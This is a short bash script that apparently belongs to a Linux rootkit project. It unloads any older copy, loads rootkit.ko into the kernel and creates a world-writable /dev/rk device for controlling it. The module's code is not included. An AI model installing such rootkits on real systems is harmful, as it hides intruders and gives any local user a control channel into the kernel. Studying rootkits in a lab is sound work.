if [[ "$(lsmod | grep rootkit)" != "" ]]
then
	echo "Removing old rootkit..."
	sudo rmmod rootkit
	sudo rm /dev/rk
fi
echo "Installing rootkit..."
# strip --strip-debug rootkit.ko
sudo insmod rootkit.ko
device="$(cat /proc/devices | grep rk | awk '{ print $1 }' | tail -n1)"
sudo mknod -m 666 /dev/rk c "$device" 1
